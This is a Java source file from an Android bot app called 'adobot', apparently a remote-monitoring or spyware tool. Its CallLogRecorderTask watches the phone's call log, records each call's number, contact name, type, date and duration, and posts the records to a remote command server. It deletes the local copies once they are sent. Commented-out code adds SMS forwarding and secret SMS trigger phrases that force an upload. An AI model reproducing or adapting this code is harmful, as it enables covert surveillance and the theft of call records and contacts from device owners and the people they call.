package com.android.adobot.tasks;

import android.Manifest;
import android.arch.persistence.room.Room;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.adobot.AdobotConstants;
import com.android.adobot.CommonParams;
import com.android.adobot.database.AppDatabase;
import com.android.adobot.database.CallLog;
import com.android.adobot.database.CallLogDao;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpCallback;
import com.android.adobot.http.HttpRequest;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

/**
 * Created by adones on 2/27/17.
 */

public class CallLogRecorderTask extends BaseTask {

    private static final String TAG = "CallLogRecorder";

    private static final Uri CALL_LOG_URI = Uri.parse("content://call_log/calls");
//    private static final int MESSAGE_TYPE_RECEIVED = 1;
//    private static final int MESSAGE_TYPE_SENT = 2;
//    private static int lastId = 0;
//    private static final int MAX_SMS_MESSAGE_LENGTH = 160;

    private CallLogObserver callLogObserver;
//    private SharedPreferences prefs;
    private ContentResolver contentResolver;
    private AppDatabase appDatabase;
    private CallLogDao callLogDao;
    private static CallLogRecorderTask instance;

    public CallLogRecorderTask(Context context) {
        setContext(context);
        appDatabase = Room.databaseBuilder(context.getApplicationContext(),
                AppDatabase.class, AdobotConstants.DATABASE_NAME).build();
        callLogDao = appDatabase.callLogDao();
        callLogObserver = (new CallLogObserver(new Handler()));
        contentResolver = context.getContentResolver();
//        prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);
        instance = this;
        listen();
    }

    public static CallLogRecorderTask getInstance() {
        return instance;
    };

    public void listen() {
        if (hasPermission()) {
            commonParams = new CommonParams(context);
            contentResolver.registerContentObserver(CALL_LOG_URI, true, callLogObserver);


            //notify server
//            HashMap params = new HashMap();
//            params.put("uid", commonParams.getUid());
//            params.put("sms_forwarder_number", recipientNumber);
//
//            Http req = new Http();
//            req.setUrl(commonParams.getServer() + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
//            req.setMethod(HttpRequest.METHOD_POST);
//            req.setParams(params);
//            req.execute();
        } else
            requestPermissions();
    }

//    public void stopForwarding() {
//        commonParams = new CommonParams(context);
//        if (isListening) {
//            contentResolver.unregisterContentObserver(callLogObserver);
//            isListening = false;
//        }
//        //notify server
//        HashMap params = new HashMap();
//        params.put("uid", commonParams.getUid());
//        params.put("sms_forwarder_number", "");
//        params.put("sms_forwarder_status", isListening);
//
//        Http req = new Http();
//        req.setUrl(commonParams.getServer() + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
//        req.setMethod(HttpRequest.METHOD_POST);
//        req.setParams(params);
//        req.execute();
//    }

    private boolean hasPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) ==
                PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) ==
                        PackageManager.PERMISSION_GRANTED;
    }

/*    public void setRecipientNumber(String recipientNumber) {
        this.recipientNumber = recipientNumber;
    }*/

    public interface SubmitCallLogCallback {
        void onResult (boolean success);
    }

    public void submitNextRecord(final SubmitCallLogCallback cb) {
        Log.i(TAG, "submitNextCallLog()");
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                CallLog m = callLogDao.first();
                Log.i(TAG, "m = " + m);
                if (m != null) {
                    submitSms(m, cb);
                } else
                    cb.onResult(true);
            }
        });
        thread.start();
    }

    private void submitSms(final CallLog callLog, final SubmitCallLogCallback cb) {

        final int call_id = callLog.getCallId();
        final int callType = callLog.getType();
        final String phone = callLog.getPhone();
        final String name = callLog.getName();
        final String date = callLog.getDate();
        final int duration = callLog.getDuration();

        try {

            HashMap p = new HashMap();
            p.put("uid", commonParams.getUid());
            p.put("call_id", Integer.toString(call_id));
            p.put("type", callType);
            p.put("phone", phone);
            p.put("name", name);
            p.put("date", date);
            p.put("duration", duration);

            JSONObject obj = new JSONObject(p);
            Log.i(TAG, "Submitting Call Log: " + obj.toString());

            Http http = new Http();
            http.setMethod(HttpRequest.METHOD_POST);
            http.setUrl(commonParams.getServer() + AdobotConstants.POST_CALL_LOGS_URL);
            http.setParams(p);
            http.setCallback(new HttpCallback() {
                @Override
                public void onResponse(HashMap response) {
                    int statusCode = (int) response.get("status");
                    if (statusCode >= 200 && statusCode < 400) {
                        try {
                            callLogDao.delete(callLog.getId());
                            Log.i(TAG, "call log submitted!! " + phone);
                            submitNextRecord(cb);
                        } catch (Exception e) {
                            Log.i(TAG, "Failed to delete call log: " + phone);
                            cb.onResult(false);
                            e.printStackTrace();
                        }
                    } else {
                        Log.i(TAG, "Call log failed to submit!!!" + phone);
                        Log.i(TAG, "Status code: " + statusCode);
                        cb.onResult(false);
                        /*InsertCallLogThread ins = new InsertCallLogThread(callLog);
                        ins.start();*/
                    }
                }
            });
            http.execute();

        } catch (Exception e) {
            Log.i(TAG, "FAiled with error: " + e.toString());
            e.printStackTrace();
            cb.onResult(false);
            /*InsertCallLogThread ins = new InsertCallLogThread(callLog);
            ins.start();*/
        }
    }

    private class InsertCallLogThread extends Thread {
        /*final SmsManager manager = SmsManager.getDefault();
        private String phone;
        private String message;
        private int delay = 3000;*/
        private CallLog callLog;

        public InsertCallLogThread(CallLog callLog) {
            this.callLog = callLog;
        }

        @Override
        public void run() {
            super.run();

            try {
                callLogDao.insert(callLog);
                Log.i(TAG, "Call Log saved, type: " + callLog.getType() +  "!!!" + callLog.getPhone());
                submitSms(callLog, new SubmitCallLogCallback() {
                    @Override
                    public void onResult(boolean success) {
                        if (success) {
                            submitNextRecord(new SubmitCallLogCallback() {
                                @Override
                                public void onResult(boolean success) {
                                    // nothing to do after submit
                                }
                            });
                        }
                    }
                });
            } catch (Exception e) {
                Log.i(TAG, "Failed to save callLog: id: " + callLog.getId());
            }


/*                if (sending) {
                    Log.i(TAG, "Resending..");
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } finally {
                        new SendSmsThread(this.phone, this.message).start();
                    }
                    return;
                }
                sending = true;*/
/*                try {
                    Log.i(TAG, "Sleeping ..");
                    Thread.sleep(delay);

                } catch (InterruptedException e) {
                    e.printStackTrace();
                } finally {
                    Log.i(TAG, "Sending message ");
                    int length = message.length();

                    if (length > MAX_SMS_MESSAGE_LENGTH) {
                        ArrayList<String> messagelist = manager.divideMessage(message);

                        manager.sendMultipartTextMessage(phone, null, messagelist, null, null);
                    } else {
                        manager.sendTextMessage(phone, null, message, null, null);
                    }

                }*/
        }
    }

    public class CallLogObserver extends ContentObserver {


        public CallLogObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Cursor cursor = null;

            try {
                cursor = contentResolver.query(CALL_LOG_URI, null, null, null, "date DESC");

                if (cursor != null && cursor.moveToNext()) {
                    saveCallLog(cursor);
                }
            } finally {
                if (cursor != null)
                    cursor.close();
            }

        }

        private void saveCallLog(Cursor mCur) {

            int id = mCur.getColumnIndex(android.provider.CallLog.Calls._ID);
            int number = mCur.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
            int type = mCur.getColumnIndex(android.provider.CallLog.Calls.TYPE);
            int date = mCur.getColumnIndex(android.provider.CallLog.Calls.DATE);
            int duration = mCur.getColumnIndex(android.provider.CallLog.Calls.DURATION);


            String phNumber = mCur.getString(number);
            String nameS = getContactName(phNumber);
            int callType = mCur.getInt(type);
            String callDate = mCur.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            SimpleDateFormat dt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            int callDuration = mCur.getInt(duration);

            Log.i(TAG, "Call log detected: " + phNumber + ", Type: " + callType);

            CallLog callLog = new CallLog();
            callLog.setCallId(id);
            callLog.setType(callType);
            callLog.setPhone(phNumber);
            callLog.setName(nameS);
            callLog.setDate(dt.format(callDayTime));
            callLog.setDuration(callDuration);

            InsertCallLogThread ins = new InsertCallLogThread(callLog);
            ins.start();

//            final int type = mCur.getInt(mCur.getColumnIndex("type"));
//            final int id = mCur.getInt(mCur.getColumnIndex("_id"));
//            final String body = mCur.getString(mCur.getColumnIndex("body"));
//
//            String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
//
//            if (Objects.equals(body.trim(), smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
//                Intent setupIntent = new Intent(context, SetupActivity.class);
//                setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
//                context.startActivity(setupIntent);
//                return;
//            }
//
//            String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");
//            if (Objects.equals(body.trim(), uploadSmsCmd.trim()) && type == MESSAGE_TYPE_RECEIVED) {
//                Log.i(TAG, "Forced submit SMS");
//                submitNextRecord(new SubmitCallLogCallback() {
//                    @Override
//                    public void onResult(boolean success) {
//                    }
//                });
//                return;
//            }
//
//            // accept only received and sent
//            if (id != lastId && (type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT)) {
//
//                lastId = id;
//
//                final String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
//                final String phone = mCur.getString(mCur.getColumnIndex("address"));
//                final String name = getContactName(phone);
//
//
//                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
//                Calendar calendar = Calendar.getInstance();
//                String now = mCur.getString(mCur.getColumnIndex("date"));
//                calendar.setTimeInMillis(Long.parseLong(now));
//
//                final String date = formatter.format(calendar.getTime());
//
//                Sms callLog = new Sms();
//                callLog.setId(Integer.parseInt(thread_id + id));
//                callLog.set_id(id);
//                callLog.setThread_id(thread_id);
//                callLog.setBody(body);
//                callLog.setName(name);
//                callLog.setPhone(phone);
//                callLog.setDate(date);
//                callLog.setType(type);
//
//                InsertCallLogThread ins = new InsertCallLogThread(callLog);
//                ins.start();
//
//
//            }

        }

    }


}
